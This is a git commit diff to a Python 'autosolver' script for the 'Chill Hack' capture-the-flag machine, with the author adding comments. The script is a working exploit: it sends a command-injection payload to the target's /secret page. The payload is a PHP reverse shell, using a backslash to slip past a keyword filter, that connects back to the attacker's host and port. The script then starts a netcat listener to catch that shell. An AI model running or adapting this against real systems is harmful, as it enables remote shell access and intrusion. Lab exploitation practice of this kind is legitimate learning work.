f31509723bf0980cf29425c673aa3ada5f1b75b0
GIH5 <128325272+GIH5@users.noreply.github.com>
2023-03-26 16:50:01 -0400

    Update Chill_Hack-autosolver.py

--- Auto-Folder/Chill_Hack-autosolver.py
+++ Auto-Folder/Chill_Hack-autosolver.py
@@ -6,21 +6,21 @@
 import requests as req
 import sys
 import os
-import socket
+#import socket - not in current use
 
 FileName = sys.argv[0]
 host = sys.argv[1] #our host
 port = sys.argv[2] #our port
 tar = sys.argv[3] #our target
 
-def nc():
+def nc(): #I keep switching back and forth between using the sys and socket library. And i might go back to working with socket.
     listen = f'nc -lnvp {port}'
     os.system(listen)
 
 def main_function(): #executes the script below to establish the shell
     print(f"starting {FileName}")
     url = f'http://{tar}/secret'
-    payload = {"command": """p\hp -r '$sock=fsockopen("{host}", {port});`sh <&3 >&3 2>&3`;'"""}
+    payload = {"command": """p\hp -r '$sock=fsockopen("{host}", {port});`sh <&3 >&3 2>&3`;'"""} #ohhh boyy im dumb, I'm sending payload to the server BEFORE i make a netcat session.
     post_data = req.post(url, data=payload)
 
     nc()
